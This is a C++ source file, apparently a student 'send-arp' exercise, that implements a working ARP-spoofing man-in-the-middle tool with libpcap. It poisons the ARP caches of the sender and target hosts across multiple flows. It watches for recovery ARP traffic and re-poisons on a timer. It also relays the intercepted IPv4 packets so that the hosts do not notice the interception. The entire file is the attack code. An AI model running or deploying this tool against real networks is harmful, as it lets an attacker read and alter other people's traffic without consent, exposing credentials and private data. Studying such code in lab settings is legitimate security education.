#include <cstdio>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <cstdint>
#include <cstring>
#include <unistd.h>
#include <vector>
#include <thread>
#include <chrono>
#include <iostream>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int getMyMac(const char* ifname, uint8_t* mac_addr) {
    struct ifreq ifr{};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return -1;

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    close(sockfd);
    return 0;
}


void send_arp_packet(pcap_t* pcap,
    const uint8_t* src_mac,
    const uint8_t* dst_mac,
    const char* src_ip,
    const char* dst_ip,
    bool is_reply) {
        EthArpPacket packet;
        
        packet.eth_.dmac_ = Mac(dst_mac);
        packet.eth_.smac_ = Mac(src_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);
        
        packet.arp_.hrd_  = htons(ArpHdr::ETHER);
        packet.arp_.pro_  = htons(EthHdr::Ip4);
        packet.arp_.hln_  = Mac::Size;
        packet.arp_.pln_  = Ip::Size;
        packet.arp_.op_   = htons(is_reply ? ArpHdr::Reply : ArpHdr::Request);
        packet.arp_.smac_ = Mac(src_mac);
        packet.arp_.sip_  = htonl(Ip(src_ip));
        packet.arp_.tmac_ = Mac(dst_mac);
        packet.arp_.tip_  = htonl(Ip(dst_ip));
        
        if (int res = pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet)); res != 0) {
            std::cerr << "[ERROR] pcap_sendpacket failed: " << pcap_geterr(pcap) << std::endl;
        }
    }
    
    Mac getMacByIp(pcap_t* pcap, const uint8_t* attacker_mac, const char* target_ip) {
        uint8_t broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
        char zero_ip[] = "0.0.0.0";
    
        send_arp_packet(pcap, attacker_mac, broadcast, zero_ip, target_ip, false);
    
        struct pcap_pkthdr* header;
        const u_char* pkt;
        EthArpPacket reply;
    
        while (true) {
            if (pcap_next_ex(pcap, &header, &pkt) <= 0) continue;
            memcpy(&reply, pkt, sizeof(reply));
    
            if (ntohs(reply.eth_.type_) != EthHdr::Arp) continue;
            if (ntohs(reply.arp_.op_) != ArpHdr::Reply) continue;
            if (reply.arp_.sip() != Ip(target_ip)) continue;
    
            return reply.arp_.smac();
        }
    }
    
struct Flow {
    uint8_t attacker_mac[6];
    uint8_t sender_mac[6];
    uint8_t target_mac[6];
    const char* sender_ip;
    const char* target_ip;
    pcap_t* pcap;
};

void infectLoop(Flow s) {
    auto last_infect = std::chrono::steady_clock::now();

    send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac, s.target_ip, s.sender_ip, true);
    send_arp_packet(s.pcap, s.attacker_mac, s.target_mac, s.sender_ip, s.target_ip, true);
    std::cout << "[INFO] Flow " << s.sender_ip << " <-> " << s.target_ip
              << " initial poisoning complete." << std::endl;

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* pkt;
        if (pcap_next_ex(s.pcap, &header, &pkt) <= 0) continue;

        EthHdr* eth = (EthHdr*)pkt;
        uint16_t type = ntohs(eth->type_);

        if (type == EthHdr::Arp) {
            EthArpPacket* arp = (EthArpPacket*)pkt;
            uint16_t op = ntohs(arp->arp_.op_);

            if (op == ArpHdr::Request) {
                bool recover = (arp->arp_.sip() == Ip(s.sender_ip) && arp->arp_.tip() == Ip(s.target_ip)) ||
                               (arp->arp_.sip() == Ip(s.target_ip) && arp->arp_.tip() == Ip(s.sender_ip));
                if (recover) {
                    std::cout << "[RECOVERY] ARP request between "
                              << s.sender_ip << " and " << s.target_ip
                              << "; reinfecting." << std::endl;
                    send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac,
                                    s.target_ip, s.sender_ip, true);
                    send_arp_packet(s.pcap, s.attacker_mac, s.target_mac,
                                    s.sender_ip, s.target_ip, true);
                    last_infect = std::chrono::steady_clock::now();
                }
            }
            else if (op == ArpHdr::Reply) {
                bool rep_s = (arp->arp_.sip() == Ip(s.sender_ip) && arp->arp_.smac() == Mac(s.sender_mac));
                bool rep_t = (arp->arp_.sip() == Ip(s.target_ip) && arp->arp_.smac() == Mac(s.target_mac));
                if (rep_s || rep_t) {
                    std::cout << "[RECOVERY] ARP reply from "
                              << (rep_s ? s.sender_ip : s.target_ip)
                              << "; reinfecting." << std::endl;
                    send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac,
                                    s.target_ip, s.sender_ip, true);
                    send_arp_packet(s.pcap, s.attacker_mac, s.target_mac,
                                    s.sender_ip, s.target_ip, true);
                    last_infect = std::chrono::steady_clock::now();
                }
            }
        }
        else if (type == EthHdr::Ip4) {
            if (eth->smac() == s.sender_mac && eth->dmac() == s.attacker_mac) {
                std::vector<u_char> relay(pkt, pkt + header->caplen);
                auto neweth = (EthHdr*)relay.data();
                neweth->smac_ = Mac(s.attacker_mac);
                neweth->dmac_ = Mac(s.target_mac);
                pcap_sendpacket(s.pcap, relay.data(), header->caplen);
            }
            else if (eth->smac() == s.target_mac && eth->dmac() == s.attacker_mac) {
                std::vector<u_char> relay(pkt, pkt + header->caplen);
                auto neweth = (EthHdr*)relay.data();
                neweth->smac_ = Mac(s.attacker_mac);
                neweth->dmac_ = Mac(s.sender_mac);
                pcap_sendpacket(s.pcap, relay.data(), header->caplen);
            }
        }

        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_infect).count() >= 100) {
            std::cout << "[PERIODIC] Reinfection timer expired; re-sending ARP poisons." << std::endl;
            send_arp_packet(s.pcap, s.attacker_mac, s.sender_mac,
                            s.target_ip, s.sender_ip, true);
            send_arp_packet(s.pcap, s.attacker_mac, s.target_mac,
                            s.sender_ip, s.target_ip, true);
            last_infect = now;
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    const char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    uint8_t attacker_mac[6];
    if (getMyMac(dev, attacker_mac) != 0) {
        std::cerr << "[ERROR] Cannot obtain local MAC on " << dev << std::endl;
        return EXIT_FAILURE;
    }

    std::vector<std::thread> threads;
    for (int i = 2; i < argc; i += 2) {
        const char* sender_ip = argv[i];
        const char* target_ip = argv[i + 1];

        pcap_t* handle = pcap_open_live(dev, 65536, 1, 1, errbuf);
        if (!handle) {
            std::cerr << "[ERROR] pcap_open_live failed: " << errbuf << std::endl;
            continue;
        }

        Flow s{};
        memcpy(s.attacker_mac, attacker_mac, 6);
        s.pcap = handle;
        Mac sm = getMacByIp(handle, attacker_mac, sender_ip);
        Mac tm = getMacByIp(handle, attacker_mac, target_ip);
        memcpy(s.sender_mac, static_cast<const uint8_t*>(sm), 6);
        memcpy(s.target_mac, static_cast<const uint8_t*>(tm), 6);
        s.sender_ip = sender_ip;
        s.target_ip = target_ip;

        std::cout << "[INFO] Starting Flow " << (i/2) << ": "
                  << sender_ip << " <-> " << target_ip << std::endl;
        threads.emplace_back(infectLoop, s);
    }

    for (auto& t : threads) t.join();
    return 0;
}

